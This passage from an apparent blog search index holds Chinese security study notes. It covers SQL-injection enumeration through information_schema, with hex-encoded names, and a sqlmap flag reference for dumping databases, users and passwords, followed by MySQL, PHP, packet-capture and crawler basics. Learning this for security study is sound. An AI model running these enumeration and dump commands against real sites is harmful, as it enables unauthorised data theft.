table_schema&#x3D;’myprefer’ limit 0,1;输出:\nsql+------------+\n| table_name |\n+------------+\n| websites   |\n+------------+\n将数据库名转为16进制:select hex(&#39;myprefer&#39;);输出:\nsql+------------------+\n| hex(&#39;myprefer&#39;)  |\n+------------------+\n| 6D79707265666572 |\n+------------------+\n这样就可以把table_schema=&#39;myprefer&#39;里的&#39;myprefer&#39;替换成0x6D79707265666572即: select table_name from information_schema.`TABLES` where table_schema&#x3D;0x6D79707265666572 limit 0,1;\n\n\n查找列\nselect collation_name from information_schema.`columns` where table_schema&#x3D;0x6D79707265666572 and table_name&#x3D;’websites’; 获取全部列名输出:\nsql+-------------+\n| column_name |\n+-------------+\n| id          |\n| name        |\n| url         |\n| alexa       |\n| country     |\n+-------------+\n\n查询结果\n有了上面查找到的信息, 我们就可以定位到目标信息, 比如要得到id和name:\nsql select id,name from myprefer.websites输出:\nsql+----+--------------+\n| id | name         |\n+----+--------------+\n|  1 | Google       |\n|  2 | 淘宝         |\n|  3 | 菜鸟教程     |\n+----+--------------+同理可以获取密码等信息\n\n\nINFORMATION_SCHEMA库SCHEMATA表\nSCHEMA_NAME字段: 数据库名\n\nTABLES表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\n\nCOLUMNS表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\nCOLUMN_NAME字段: 列名\n\n防范措施\n代码层面\n对输入进行严格的转义和过滤\n使用预处理和参数化(Parameterized)(推荐)\n\n\n网路层面\n通过WAF设备启用防SQL注入策略(类似防护系统)\n云端防护\n\n\n\nSQLmap使用SQLmap使用教程图文教程（超详细）-CSDN博客\n文档介绍 - sqlmap 用户手册 (highlight.ink)\n\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; //带上cookie对URL进行注入探测\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; --current-db //获取数据库名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx --tables //获取表名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx --columns //获取列名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx -C xxx yyy,zzz,xxx --dump //获取指定列的信息tip:--start 1 --stop 10 (只获取前十列数据)\n\n\n参考:\ntxt --columns //查看所有列\n --dbs   //查看所有数据库\n --dump //查看字段具体信息\n --users //查看所有用户\n --current-db //查看当前的数据库\n --current-user //产看当前的用户\n --is-dba //查看是否是最高权限\n --passwords //查看所有密码\n –hostname //查看主机名\n privileges -U username //查看用户权限\n –roles //查看用户角色\n --tables //查看所有表help:\ntxt-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行\n-l log.txt          可以将代理的日志作为目标去检测[见下图]\n-m 1.txt            对于多个URL，可以一排一个写入文件后加载\n--force-ssl         对于使用SSL的URL要在后面加上这个参数\n--data              对于使用post方法，可以将参数写在data后面\n--param-del=&quot;&quot;          \n--cookie=&quot;&quot;  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1\n--random-agent          使用随机的user-agent\n--user-agent=&quot;&quot;  level 3    指定user-agent，如要检测它是否有漏洞level要高于2\n--header=&quot;\\n&quot;           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\\n分隔\n--method=GET POST       设置提交方式，默认一个一个的尝试\n--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用\n--auth-cred &quot;user:pass&quot;     填写账号和密码\n --proxy=&quot;http:127.0.0.1:8087&quot;  使用代理\n--proxy-cred=&quot;name:pass&quot;    如果代理要密码的话\n--ignore-proxy          强制不使用代理\n--delay             请求延迟间隔，单位秒，默认无延迟\n--retries           链接失败重试次数3\n--timeout           链接超时时间30\n--randomize=&quot;param&quot;     使用和源参数类型长度一致的参数\nsqlmap -l l.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名\nsqlmap -l 2.log --scope=&quot;(19)?\\.168\\.20\\.(1|11|111)&quot;        同上，筛选19*.168.20.1/11/111这几个网段的IP\n--safe-url=&quot;url&quot;        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生\n--safe-freq 10          尝试的与正确的URL的交换频率\n--skip-urlencode        有的URL在get方式提交时没编码，就要用这个\n--eval=&quot;&quot;php代码      这个后面可以跟PHP代码，能够执行\n--keep-alive            保持连接会降低资源使用，但是不能与代理兼容\n--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容\n--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容\n--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】\n-o              使用除了--threads的全部的优化参数\n-p              指定参数，使level失效\n-skip               排除不扫描的参数\n                对于伪静态网页，就在参数后面加*\n--dbms              接数据库管理系统，如MySQL\n--os                接系统，如Linux\n--invalid-bignum        使用大数作为假的值\n--invalid-logical       使用逻辑数作为假的值\n--no-cat            对于接收到的null不自动转换成空格\n--no-escape         不使用逃逸，就是不把&#39;转换成asii码形式\n--prefix            在参数前指定前缀\n--suffix            在参数后指定后缀\n--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息\n--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容\n--string            当页面含有这个字符串时为真\n--not-string            当页面不含这个字符串时为真\n--regexp            用正则表达式判断\n--code              当状态代码为*时为真\n--text-only         页面含有*时为真\n--titles            页面标题为*时为真\n--techniques \nB E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询\n--time-sec          \n--union-cols            联合查询第几列到第几列\n--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位\n--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方\n-fingerprint            指纹信息\n--banner            版本信息\n--batch             按照软件默认设置，自动回答\n--count             计数\n-s              将这个会话保存下次继续\n-t              将这些数据保存\n--charset           强制设置数据库编码\n--crawl             设置蜘蛛爬行的深度\n--csv-del           设置下载的数据的分隔方式，默认是,\n--dbms-cred         设置数据库用户\n--flush-session         清空以前的会话数据\n--fresh-queries         不清空会话，重新查询\n--hex               一16进制编码的方式传输数据\n--output-dir            会话输出文件夹\n--parse-errors          显示MySQL错误信息\n--save              保存当前配置为文件\n-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.\n--answers           这个可以对一些特定的问题作出回答，在自动化注入中用\n--check-waf         检查是否含有waf等\n--identify-waf          彻底的检查waf等的信息\n--smart     当有大量目标时，这个就只检查基于错误的注入点\n--mobile    模拟智能手机去扫描\n--wizard    向导模式\n--purge-out 清除输出内容","slug":"第四次课程-XSS与SQL注入","date":"2024-02-02T07:12:03.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议,XSS基础,SQL注入","author_index":"Myprefer"},{"id":"bcd80a5ebbb48bb852bbee5672f0a5b3","title":"第三周课程-SQL与PHP","content":"MySQL基本操作sql-- 创建数据库\nCREATE DATABASE 数据库名;\n\n-- 选择数据库\nUSE 数据库名;\n\n-- 创建表格\nCREATE TABLE 表格名 (\n    列1 数据类型,\n    列2 数据类型,\n    ...\n);\n\n-- 插入数据\nINSERT INTO 表格名 (列1, 列2, ...)\nVALUES (值1, 值2, ...);\n\n-- 查询数据\nSELECT 列1, 列2, ...\nFROM 表格名\nWHERE 条件;\n\n-- 更新数据\nUPDATE 表格名\nSET 列1 = 值1, 列2 = 值2, ...\nWHERE 条件;\n\n-- 删除数据\nDELETE FROM 表格名\nWHERE 条件;\n\n-- 删除表格\nDROP TABLE 表格名;\n\n-- 删除数据库\nDROP DATABASE 数据库名;\n\n-- 修改表格结构（添加列）\nALTER TABLE 表格名\nADD COLUMN 新列 数据类型;\n\n-- 修改表格结构（修改列）\nALTER TABLE 表格名\nMODIFY COLUMN 列名 数据类型;\n\n-- 修改表格结构（删除列）\nALTER TABLE 表格名\nDROP COLUMN 列名;\nORDER BY 字句，排列语句：\ntxtSELECT *或其他 FROM 数据表(可以是多个) ORDER BY 字段 ASC/DESC;ASC是升序排序，DESC是降序排序。     \n我们可以使用数字来进行判断列长度，比如： \n![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;判断列的长度.jpg) \n观察不同点在哪\nUNION字句，联合查询\n所谓联合查询，就是查询不同的两个表，将要查询的信息合并显示。联合查询有两个子句：UNION 子句：查询后不显示重复数据UNION ALL 子句：查询后会显示重复数据            \nsqlSELECT (*或其他) FROM 数据表1 UNION SELECT (*或其他) FROM 数据表2；![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;联合查询.jpg)\nMySQL其他知识点1、MySQL的注释：#从这开始到后面都是注释，--从这开始到后面都是注释，/*这全是注释*/2、常见的内置函数\nsqldatabase() : 显示当前数据库名称\ncurrent_user ： 显示当前用户\nversion() : 显示当前数据库版本![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;内置函数.png)\nPHP基础说明\n全称”超文本预处理器”\nPHP在WEB中充当中间人的角色，它主要处理WEB数据\nPHP的工作流程:\n\n变量\n以 $开头, 如$_a\n大小写敏感\n\n超级全局变量\n$GLOBALS是一个包含了全部变量的全局组合数组,  变量的名字就是数组的键\nphp$a = 10;\nfunction test()\n&#123;\n    echo $GLOBALS[&#39;a&#39;]; #输出10\n    $GLOBALS[&#39;b&#39;] = 20;\n&#125;\ntest();\necho &#39;&lt;br&gt;&#39; . $b; # 输出 20\n$_SERVER包含服务器和执行环境的信息, 如头信息(header)、路径(path)、以及脚本位置等 ,例如:\nphp$_SERVER[&#39;SERVER_NAME&#39;];\n$_REQUEST用于收集HTML表单提交的数据, 例如:\nphp&lt;html&gt;\n&lt;body&gt;\n \n&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;\nName: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n \n&lt;?php \n$name = $_REQUEST[&#39;fname&#39;]; \necho $name; \n?&gt;\n \n&lt;/body&gt;\n&lt;/html&gt;\n$_POST用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”\n\n$_GET用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”, 也可以收集URL中发送的数据\n例如一个超链接包含要提交的了subject和web数据\nhtml&lt;a href=&quot;test_get.php?subject=PHP&amp;web=Myprefer.github.io&quot;&gt;Test $GET&lt;/a&gt;通过超链接打开test_get.php:\nphp&lt;?php \necho &quot;Study &quot; . $_GET[&#39;subject&#39;] . &quot; @ &quot; . $_GET[&#39;web&#39;];\n?&gt;输出:\ntxtStudy PHP @ Myprefer.github.io\n_ENV包含环境变量的信息\n\n\n运算符\n字符串运算符: $a = $a . $b连接 a, b两个字符串\n\n逻辑运算符xor:异或 \tx xor y如果 x 和 y 有且仅有一个为 true，则返回 true\n\n数组运算符:\n\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n集合\nx 和 y 的集合\n\n\nx &#x3D;&#x3D; y\n相等\n如果 x 和 y 具有相同的键&#x2F;值对，则返回 true\n\n\nx &#x3D;&#x3D;&#x3D; y\n恒等\n如果 x 和 y 具有相同的键&#x2F;值对，且顺序相同类型相同，则返回 true\n\n\nx !&#x3D; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx &lt;&gt; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx !&#x3D;&#x3D; y\n不恒等\n如果 x 不等于 y，则返回 true\n\n\n\n组合比较符&lt;=&gt;\nphp$c = $a &lt;=&gt; $b;\n如果 $a &gt; $b, 则 $c 的值为 1。\n如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。\n如果 $a &lt; $b, 则 $c 的值为 -1。\n\n\n\n关联数组\n关联数组是使用自己分配给数组的指定的键的数组。\nphp$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);php$age[&#39;Peter&#39;]=&quot;35&quot;;\n$age[&#39;Ben&#39;]=&quot;37&quot;;\n$age[&#39;Joe&#39;]=&quot;43&quot;;\n遍历关联数组\nphp$age = array(&#39;He&#39; =&gt; 35, &#39;She&#39; =&gt; 28, &#39;Me&#39; =&gt; 18);\n\nforeach ($age as $key =&gt; $value) &#123;\n    echo &#39;&#39; . $key . &#39; &#39; . $value . &#39;&#39;;\n    echo &#39;&lt;br&gt;&#39;;\n&#125;\n参考手册:PHP 5 Array 函数\n\n\n魔术常量\n__line__文件中的当前行号\n\n__FILE__文件的绝对路径和文件名。如果用在被包含文件中，则返回被包含的文件名\n\n__DIR__文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。等价于 dirname(__FILE__)\n\n__FUNCTION__函数名称\n\n__CLASS__类的名称\n\n__TRAIT__Trait 的名字\n\n__METHOD__类的方法名\n\n__NAMESPACE__当前命名空间的名称\n\n\n类与对象\n如下:\nphp&lt;?php\nclass phpClass &#123;\n  var $var1;\n  var $var2 = &quot;constant string&quot;;\n  \n  function myfunc ($arg1, $arg2) &#123;\n     [..]\n  &#125;\n  [..]\n&#125;\n?&gt;\n类的变量使用 var 来声明, 变量也可以初始化值。\n\n\n构造函数\nphpvoid __construct ([ mixed $args [, $... ]] )例如:\nphpfunction __construct( $par1, $par2 ) &#123;\n   $this-&gt;url = $par1;\n   $this-&gt;title = $par2;\n&#125;\n析构函数\nphpvoid __destruct ( void )在实例销毁时执行\n\n继承:\nphpclass Child extends Parent &#123;\n   // 代码部分\n&#125;\n接口\n\n使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容\n\n接口中定义的所有方法都必须是公有\n\n例如:\nphp&lt;?php\n\n// 声明一个&#39;iTemplate&#39;接口\ninterface iTemplate\n&#123;\n    public function setVariable($name, $var);\n    public function getHtml($template);\n&#125;\n\n\n// 实现接口\nclass Template implements iTemplate\n&#123;\n    private $vars = array();\n  \n    public function setVariable($name, $var)\n    &#123;\n        $this-&gt;vars[$name] = $var;\n    &#125;\n  \n    public function getHtml($template)\n    &#123;\n        foreach($this-&gt;vars as $name =&gt; $value) &#123;\n            $template = str_replace(&#39;&#123;&#39; . $name . &#39;&#125;&#39;, $value, $template);\n        &#125;\n \n        return $template;\n    &#125;\n&#125;\n\n\n\n日期与时间时间函数:phpstring date ( string $format [, int $timestamp ] )\n\n\n参数\n描述\n\n\n\nformat\n必需。规定时间戳的格式。\n\n\ntimestamp\n可选。规定时间戳。默认是当前的日期和时间。\n\n\n实例:\nphp&lt;?php\necho date(&quot;Y/m/d&quot;) . &quot;&lt;br&gt;&quot;;\necho date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;\necho date(&quot;Y-m-d&quot;);\n?&gt;输出:\nphp2016/10/21\n2016.10.21\n2016-10-21include与require\n作用: 在执行php文件之前插入一个文件的内容\n\n区别–错误处理: include–warning,   require–error\n\n使用: \nphpinclude &#39;filename&#39;;\n# 或者\nrequire &#39;filename&#39;;\n\n文件操作\n打开:fopen()\n\n关闭:fclose()\n\n检测文件末尾:feof()\n\n逐行读取文件:\nphp&lt;?php\n$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\n// 读取文件每一行，直到文件结尾\nwhile(!feof($file))\n&#123;\n    echo fgets($file). &quot;&lt;br&gt;&quot;;\n&#125;\nfclose($file);\n?&gt;\n\nCookie\n创建cookie:\nphpsetcookie(name, value, expire, path, domain);\nexpire:可选参数, cookie的过期时间, 秒数表示\npath:可选, 指定可以访问的cookie的页面路径\ndomain:可选, cookie可用域\n\n\n取回Cookie的值: $_COOKIE[&quot;name&quot;]isset($_COOKIE[&#39;name&#39;])用于确认是否已经设置cookie\n\n删除cookie:使过期日期变更为过去的时间点, 例如\nphpsetcookie(&quot;user&quot;, &quot;&quot;, time()-3600);\n\n与MySQL交互基本流程:\n\n连接:\nphpmysqli_connect(&quot;MySQL服务器地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;连接数据库名称（可选）&quot;,&quot;MySQL服务器使用的端口（默认3306）&quot;)\n选择数据库:\nphpmysqli_select_db(&quot;连接表示(必选参数)&quot;,&quot;数据库名称(必选参数)&quot;)\n执行SQL语句:\nphpmysqli_query(&quot;连接标识(必选参数)&quot;,&quot;查询语句(必选参数)&quot;)\n获取查询结果:\nphpmysqli_fetch_array()：//将结果集返回数组中。\nmysqli_fetch_object()：//从结果集中获取一行作为对象\nmysqli_fetch_row()：//从结果集中获取一行作为枚举数组\nmysqli_fetch_assoc()：//从结果集中获取一行作为关联数组\nmysqli_num_rows()：//获取查询结果集中的记录数\n关闭连接, 释放内存:\nphpmysqli_free_result(): \t//释放结果内存。\nmysqli_close()：//关闭先前打开的数据库连接。\n\n","slug":"第三周课程-SQL与PHP","date":"2024-02-01T07:08:19.000Z","categories_index":"","tags_index":"网络安全,学习日志,SQL基础,视频会议,PHP基础","author_index":"Myprefer"},{"id":"fc2ea42bf73e82995b845fcd034aa542","title":"MySQL数据库基础","content":"数据库基本操作MySQL登录&#x2F;退出\n登录: mysql -u root -p\n或mysql -u root -p -P 3306 -h 127.0.0.1指定IP和端口, 远程连接数据库\n\n退出: exit, quit, \\q\n\n\n一些解释\n数据库就相当于文件夹\n表就相当于文件\nSQL对大小写不敏感\nSQL语句末端必须使用分号\n\n注释sql# 注释1\n-- 注释2\n/* 注释3 */MySQL数据类型Text(文本)类型\n\n\n数据类型\n描述\n\n\n\nCHAR(size)\n保存固定长度的字符串。最多 255 个字符。\n\n\nVARCHAR(size)\n保存可变长度的字符串。最多 255 个字符。注释：如果值的长度大于 255，则被转换为 TEXT 类型。\n\n\nTINYTEXT\n存放最大长度为 255 个字符的字符串。\n\n\nTEXT\n存放最大长度为 65,535 个字符的字符串。\n\n\nMEDIUMTEXT\n存放最大长度为 16,777,215 个字符的字符串。\n\n\nLONGTEXT\n存放最大长度为 4,294,967,295 个字符的字符串。\n\n\nBLOB\n用于 BLOBs（Binary Large Objects, 用于存储大量二进制数据）。存放最多 65,535 字节的数据。\n\n\nMEDIUMBLOB\n用于 BLOBs（Binary Large Objects）。存放最多 16,777,215 字节的数据。\n\n\nLONGBLOB\n用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。\n\n\nENUM(x,y,z,etc.)\n允许您输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。注释：这些值是按照您输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)\n\n\nSET\n与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。\n\n\nNumber(数字) 类型：\n\n\n数据类型\n描述\n\n\n\nTINYINT(size)\n带符号-128到127 ，无符号0到255。\n\n\nSMALLINT(size)\n带符号范围-32768到32767，无符号0到65535, size 默认为 6。\n\n\nMEDIUMINT(size)\n带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9\n\n\nINT(size)\n带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11\n\n\nBIGINT(size)\n带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20\n\n\nFLOAT(size,d)\n带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。\n\n\nDOUBLE(size,d)\n带有浮动小数点的大数字。\n\n\nDECIMAL(size,d)\n作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。\n\n\n\n\n\n\n\n\n\n\n\n实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 bytes 的存储空间。就是在显示给用户的方式有点不同\n例如：\nint的值为10 （指定zero fill）\ntxtint（9）显示结果为000000010\nint（3）显示结果为010\nDate(时间)类型:\n\n\n数据类型\n描述\n\n\n\nDATE()\n日期。格式：YYYY-MM-DD注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’\n\n\nDATETIME()\n*日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’\n\n\nTIMESTAMP()\n*时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC\n\n\nTIME()\n时间。格式：HH:MM:SS注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’\n\n\nYEAR()\n2 位或 4 位格式的年。注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。\n\n\n一些SQL基本操作操作手册\nSQL 快速参考\n\n查看\nshow databases;查看所有数据库\nshow tables; 查看数据库下的所有表\nSELECT * FROM &lt;表Name&gt;; 读取表的信息\ndesc &lt;表Name&gt;; 查看表的结构\n\n选择\nuse &lt;数据库Name&gt;;选择数据库\n\n新建\ncreate database db1: 创建新数据库db1\n\n建表:create table tb1(\n属性名 数据类型 [完整约束条件],属性名 数据类型 [完整约束条件],…….\n);数据库引擎等配置\n\n约束(Constraints):\n\nNOT NULL - 指示某列不能存储 NULL 值。\n\nUNIQUE - 保证某列的每行必须有唯一的值。\n\nPRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。\n\n每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束\n\nFOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。\n\nCHECK - 保证列中的值符合指定的条件。\n\nDEFAULT - 规定没有给列赋值时的默认值。\n\nAUTO_INCREMENT - 在新纪录插入表中时生成一个唯一的数字\n\n\n\n\n删除\ndrop database db1;删除数据库db1\n\n修改\nalter database db1 charset uf8; 将数据库字符集改为utf8\n\nSELECT语句: 选取数据\nSELECT column1, column2, ...FROM table_name;选取column1, column2\n\nSELECT * FROM table_name;选取全部\n\nDISTINCT: 用于返回唯一不同的值:SELECT DISTINCT column1, column2, ... FROM table_name;\n\n限制: SELECT * FROM Websites LIMIT 2;选取的是头两条记录\n\nWHERE子句: 用于过滤\n\n逻辑运算: 使用and&#x2F;or\n\nLIKE操作符: 指定where搜索模式:SELECT column1, column2, ... FROM table_name WHERE column (NOT) LIKE pattern;pattern为搜索模式\n\n通配符:通常与LIKE操作符一起使用\n\n\n\n通配符\n描述\n\n\n\n%\n替代 0 个或多个字符\n\n\n_\n替代一个字符\n\n\n[charlist]\n字符列中的任何单一字符\n\n\n[^charlist] 或 [!charlist]\n不在字符列中的任何单一字符\n\n\n\n\n\nORDER BY关键字: 排序\n\n用于select\nSELECT column1, column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;\nASC表示升序排序, DESC表示降序排序\n\n\n\nINSERT INTO 语句: 插入\n不指定, 直接加入到表: INSERT INTO table_name VALUES (value1,value2,value3,...);\n指定列,一一对应:INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...);\n\nUPDATE语句: 更新(更改)\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;\ncondition：修改条件，用于指定哪些数据要修改。\n\nDELETE: 删除表中的记录\n删除行: DELETE FROM table_name WHERE condition;\n删除所有: DELETE FROM table_name;\n\n连接(JOIN)\n下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。\n\nSQL函数SQL Aggregate 函数\nAVG() - 返回平均值SELECT AVG(column_name) FROM table_name\nCOUNT() - 返回行数\nMAX() - 返回最大值\nMIN() - 返回最小值\nSUM() - 返回总和\n\nGROUP BY 语句\n用于结合聚合(Aggregate)函数, 根据一个或多个列对结果进行分组\n\n语法:\nsqlSELECT column_name, aggregate_function(column_name)\nFROM table_name\nWHERE column_name operator value\nGROUP BY column_name;例如:\nsql+-----+---------+-------+------------+\n| aid | site_id | count | date       |\n+-----+---------+-------+------------+\n|   1 |       1 |    45 | 2016-05-10 |\n|   2 |       3 |   100 | 2016-05-13 |\n|   3 |       1 |   230 | 2016-05-14 |\n|   4 |       2 |    10 | 2016-05-14 |\n|   5 |       5 |   205 | 2016-05-14 |\n|   6 |       4 |    13 | 2016-05-15 |\n|   7 |       3 |   220 | 2016-05-15 |\n|   8 |       5 |   545 | 2016-05-16 |\n|   9 |       3 |   201 | 2016-05-17 |\n+-----+---------+-------+------------+运行SELECT site_id, SUM(access_log.count) AS nums FROM access_log GROUP BY site_id;后输出:\nsql+---------+-------+\n| site_id |  nums |\n+---------+-------+\n|       1 |    275|\n|       2 |    10 |\n|       3 |   521 |\n|       4 |    13 |\n|       5 |   750 |\n+---------+-------+\n\nHAVING 语句\n类似于WHERE语句, 但是可以和聚合函数一起使用\n\nSQL Scalar 函数\nUCASE() - 将某个字段转换为大写\nLCASE() - 将某个字段转换为小写\nMID() - 从某个文本字段提取字符，MySql 中使用\nSubString(字段，1，end) - 从某个文本字段提取字符\nLEN() - 返回某个文本字段的长度\nROUND() - 对某个数值字段进行指定小数位数的四舍五入\nNOW() - 返回当前的系统日期和时间\nFORMAT() - 格式化某个字段的显示方式\n\nMySQL 日期函数:\n\n\n函数\n返回示例&#x2F;描述\n\n\n\nNOW()\n2008-11-11 12:45:34\n\n\nCURDATE()\n2008-11-11\n\n\nCURTIME()\n12:45:34\n\n\nDATE()\n2008-11-11&#x2F;提取日期或日期&#x2F;时间表达式的日期部分\n\n\nEXTRACT()\n返回日期&#x2F;时间的单独部分\n\n\nDATE_ADD()\n向日期添加指定的时间间隔\n\n\nDATE_SUB()\n从日期减去指定的时间间隔\n\n\nDATEDIFF()\n返回两个日期之间的天数\n\n\nDATE_FORMAT()\n用不同的格式显示日期&#x2F;时间\n\n\ninformation_schema信息数据库介绍\nInformation_schema 是 MySQL 数据库中的一个系统数据库，它包含有关数据库服务器的元数据信息，这些信息以表的形式存储在 information_schema 数据库中。\n\nSCHEMATA 表\n存储有关数据库的信息，如数据库名、字符集、排序规则等。\n\nTABLES 表\n包含有关数据库中所有表的信息，如表名、数据库名、引擎、行数等。\n\nCOLUMNS 表\n包含有关表中列的信息，如列名、数据类型、是否允许 NULL 等。\n\nSTATISTICS 表\n提供有关表索引的统计信息，如索引名、列名、唯一性等。\n\nKEY_COLUMN_USAGE 表\n包含有关表中外键的信息，如外键名、列名、关联表等。\n\nREFERENTIAL_CONSTRAINTS 表\n存储有关外键约束的信息，如约束名、关联表等。\n\n跨库查询说明\n在权限较大时才可以进行跨库查询\n\n查询库\nSELECT SCHENA_NAME from information_schema.SCHEMATA limit n, 1;查询第n个(下标从0开始)库的名字\n输出:\nsql+-------------+\n| schema_name |\n+-------------+\n| myprefer    |\n+-------------+\n\n查询表\nselect table_name from information_schema.`TABLES` where table_schema&#x3D;’myprefer’ limit 0,1;输出:\nsql+------------+\n| table_name |\n+------------+\n| websites   |\n+------------+\n将数据库名转为16进制:select hex(&#39;myprefer&#39;);输出:\nsql+------------------+\n| hex(&#39;myprefer&#39;)  |\n+------------------+\n| 6D79707265666572 |\n+------------------+\n这样就可以把table_schema=&#39;myprefer&#39;里的&#39;myprefer&#39;替换成0x6D79707265666572即: select table_name from information_schema.`TABLES` where table_schema&#x3D;0x6D79707265666572 limit 0,1;\n\n\n查找列\nselect collation_name from information_schema.`columns` where table_schema&#x3D;0x6D79707265666572 and table_name&#x3D;’websites’; 获取全部列名  输出:\n\nsql+-------------+\n| column_name |\n+-------------+\n| id          |\n| name        |\n| url         |\n| alexa       |\n| country     |\n+-------------+查询结果\n有了上面查找到的信息, 我们就可以定位到目标信息, 比如要得到id和name:\nsql select id,name from myprefer.websites输出:\nsql+----+--------------+\n| id | name         |\n+----+--------------+\n|  1 | Google       |\n|  2 | 淘宝         |\n|  3 | 菜鸟教程     |\n+----+--------------+同理可以获取密码等信息\n\n\nINFORMATION_SCHEMA库SCHEMATA表\nSCHEMA_NAME字段: 数据库名\n\nTABLES表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\n\nCOLUMNS表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\nCOLUMN_NAME字段: 列名\n\n","slug":"MySQL数据库基础","date":"2024-01-28T15:13:22.000Z","categories_index":"","tags_index":"网络安全,学习日志,SQL基础","author_index":"Myprefer"},{"id":"d471c3c5657b4c4f477f2defc20d21ed","title":"小迪安全 P3","content":"\n\n\n\n\n\n\n\n\n学会不同对象采用不同抓包封包抓取技术分析\n抓包\n当需要知道应用程序等的IP, 域名时需要抓包后分析\n对不同的协议用不同的工具\nweb协议: Charles, Fiddler, Burpsuite\n其他非web协议: WireShark, 科来网络分析系统\n\n\n\n","slug":"小迪安全-P3","date":"2024-01-28T13:29:15.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"a7f9556995dc0359ec899cd406ee1ae6","title":"Python爬虫基础","content":"Python爬虫基础爬虫概念定义\n网络爬虫是伪装成客户端与服务端进行数据交互的程序。\n\n应用\n数据采集, 搜索引擎, 模拟操作, 软件测试, 